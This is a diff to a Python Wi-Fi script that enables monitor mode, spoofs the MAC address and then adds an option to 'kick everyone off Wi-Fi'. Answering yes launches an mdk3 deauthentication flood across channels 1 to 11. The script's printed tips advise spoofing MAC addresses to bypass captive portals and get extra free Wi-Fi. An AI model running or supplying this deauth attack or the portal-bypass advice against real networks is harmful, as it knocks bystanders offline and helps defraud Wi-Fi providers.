@@ -19,7 +19,7 @@ class colors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-# Function for calling shellscripts within python script
+# Function for calling shell scripts within python script
 def cmd(cmd):
 	os.system(cmd)
 
@@ -33,7 +33,7 @@ cmd('airmon-ng start wlan0')
 cmd('clear')
 print colors.GREEN+ '[..] PRESS [CTRL] + [C] to stop Monitor Mode' + colors.WHITE
 print 
-print colors.BOLD+'[HACK TIP]'+colors.WHITE
+print colors.BOLD+'[PROTIP]'+colors.WHITE
 print '- Wait till you get enough frames.'
 print '- Spoof your Mac Address to bypass captive portals.'
 print '- Change your Mac Address to gain extra complimentary Wi-Fi'
@@ -52,5 +52,17 @@ cmd('macchanger -m '+mac+' wlan0')
 print colors.YELLOW+'[+] Wi-Fi turned back on'+colors.WHITE
 cmd('sleep 2.5')
 cmd('ifconfig wlan0 up')
-print colors.GREEN+'[!] All Done.'+colors.WHITE
 cmd('ifconfig | grep wlan0')
+print colors.GREEN+'[!] All Done - New mac address should be %s' %(mac)+colors.WHITE
+jam = raw_input(colors.RED+'[?] Would you like to kick everyone off Wi-Fi (yes/no): '+colors.WHITE)
+if jam == 'yes':
+	print colors.YELLOW+'[+] Opening new terminal window for deAuth attack...'
+	print '		... press [CTRL]+[C] twice when you want to stop the attack'+colors.WHITE
+	#cmd('airmon-ng start wlan0')
+	cmd('gnome-terminal -e "mdk3 mon0 d -c 1,2,3,4,5,6,7,8,9,10,11" & gnome-terminal -e "airodump-ng mon0"')
+	cmd('ifconfig wlan0 down')
+	#cmd('sleep 1.5')
+	cmd('ifconfig wlan0 up')
+	print colors.YELLOW+'[+] Script is done running...'+colors.WHITE
+else:
+	print colors.YELLOW+'[+] Script is done running...'+colors.WHITE
